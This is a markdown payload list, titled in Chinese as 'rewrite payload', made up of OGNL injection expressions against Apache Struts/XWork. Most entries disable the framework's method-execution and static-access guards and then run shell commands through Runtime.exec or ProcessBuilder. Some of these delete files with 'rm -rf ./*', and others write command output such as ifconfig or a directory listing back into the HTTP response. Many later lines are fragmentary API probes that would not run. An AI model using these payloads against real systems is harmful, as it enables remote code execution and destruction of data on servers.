<!-- Created by Frank -->

# 重写 payload

```js
// 1
%{"userDir{" + @java.lang.System@getProperty("user.dir") + "}"} 

// 2
%{"osName{" + @java.lang.System@getProperty("os.name") + "}"} 

// 3
%{@java.lang.System@clearProperty("java.class.path")} 

// url encoded
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'/bin/bash\u0020-c\u0020rm\u0020-rf\u0020./*\')')(a)(b)

// InputStream
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream()),#q}

// Writer
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "ifconfig"})).start().getInputStream(),#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a)),#c=new char[50000],#b.read(#c),#d=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#d.getWriter().println(new java.lang.String(#c)),#d.getWriter().flush(),#d.getWriter().close()}

// 04.06
%{@java.io.File@createNewFile()}

%{@java.io.File@getCanonicalPath()}

%{@java.io.File@.delete()}

%{#a=new java.io.File("~/test.txt"),#a.setExecutable(true),
    #b=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "rm -rf ./*"})).start()}

%{#a=new java.io.File("~"),#a.list()}

%{@java.io.FileDescriptor}

%{@java.io.FileDescriptor@sync()}

%{@java.io.FileInputStream}

%{@java.io.FileInputStream@getChannel()}

%{@java.io.FileInputStream@getFD()}

%{@java.io.FileInputStream@read(byte[] b, int off, int len)}

%{@java.io.FileOutputStream}

%{@java.io.FileOutputStream@write(byte[] b, int off, int len)}

%{@java.io.FilePermission}

%{@java.io.FilePermission@getActions()}

%{@java.io.FilePermission@newPermissionCollection()}

%{@java.io.Console}

%{@java.io.Console@flush()}

%{@java.io.Console@readLine(String fmt, Object...args)}

%{@java.io.Console@readPassword(String fmt, Object... args)}

%{@java.io.Console@reader()}

%{@java.io.Console@writer()}

%{@java.io.DataInputStream}

%{@java.io.DataInputStream@read(byte[] b, int off, int len)}

%{@java.io.DataInputStream@readFully(byte[] b, int off, int len)}

%{@java.io.DataInputStream@readUTF(DataInput in)}

%{@java.io.DataOutputStream}

%{@java.io.DataOutputStream@write(byte[] b, int off, int len)}

%{@java.io.DataOutputStream@writeUTF(String str)}

%{@java.io.FileReader}

%{@java.io.FileWriter}

%{@java.io.Reader}

%{@java.io.Reader@read(char[] cbuf, int off, int len)}

%{@java.io.Writer}

%{@java.io.Writer@append(CharSequence csq)}

%{@java.io.Writer@write(char[] cbuf, int off, int len)}

%{@java.io.SerializablePermission}

%{@java.io.RandomAccessFile}

%{@java.io.RandomAccessFile@getFilePointer()}

%{@java.io.RandomAccessFile@read(byte[] b, int off, int len)}

%{@java.io.RandomAccessFile@readFully(byte[] b, int off, int len)}

%{@java.io.RandomAccessFile@write(byte[] b, int off, int len)}

%{@java.io.RandomAccessFile@readUTF()}

%{@java.io.RandomAccessFile@writeUTF(String str)}

%{@java.io.PipedReader}

%{@java.io.PipedReader@connect(PipedWriter src)}

%{@java.io.PipedReader@read(char[] cbuf, int off, int len)}

%{@java.io.PipedWriter}

%{@java.io.PipedWriter@connect(PipedReader snk)}

%{@java.io.PipedWriter@write(char[] cbuf, int off, int len)}

%{@java.io.BufferedInputStream}

%{@java.io.BufferedInputStream@read(byte[] b, int off, int len)}

%{@java.io.BufferedOutputStream}

%{@java.io.BufferedOutputStream@write(byte[] b, int off, int len)}

%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "rm -rf ./*"})).start()}

%{@java.lang.Runtime@getRuntime().exec("ls -als")}

%{#a=new java.lang.Runtime().exec("rm -rf ./*")}

%{#a=new java.lang.Runtime().exec("ls -las", new java.io.File("/"))}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    #a=new java.lang.String("test").getClass().getClassLoader()}

%{@com.opensymphony.xwork.ActionContext@getContext()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    @java.lang.Compiler@disable()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    @java.lang.Compiler@compileClass(new java.lang.String("test").getClass())}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    @java.lang.Compiler@command("javac java.lang.String")}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    #a=new java.lang.String("test"),#a.getClass()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    #a=new java.lang.Process().destroy()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    #a=new java.lang.Package().getImplementationVendor()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    #a=new java.lang.Package().getImplementationTitle()}

%{#_memberAccess.allowStaticMethodAccess=true,
  #context["xwork.MethodAccessor.denyMethodExecution"]=false,
  #a=new java.lang.SecurityManager()}

%{#a=new java.lang.Object()}

%{#a=new java.lang.Thread()}

%{#a=new java.lang.ThreadGroup()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    @sun.misc.Unsafe@getUnsafe()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    #f=@sun.misc.Unsafe.class.getDeclaredField("theUnsafe"),
    #f.setAccessible(true),
    #unsafe=#f.get(null)}

%{#a=new javax.script.ScriptEngineManager().getEngineByName().eval("println('hello!')")}

%{#a=new javax.script.ScriptEngineManager().getBindings()}

%{#_memberAccess.allowStaticMethodAccess=true,
    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
    #a=new javax.persistence.EntityManager(){public void clear(){}}.clear()}

%{#em=@javax.persistence.Persistence@createEntityManagerFactory("test").createEntityManager(),
   #em.createQuery("select * from Student")}

%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext()}

%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().setAttribute("test", "hello")}

%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().getInitParameterNames()}

%{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().getResourceAsStream("~/test.txt")}

%{@java.lang.ClassLoader@getSystemClassLoader()}
  
%{#_memberAccess.allowStaticMethodAccess=true,
  #context["xwork.MethodAccessor.denyMethodExecution"]=false,
  #a=new com.opensymphony.xwork.ActionContext()}
```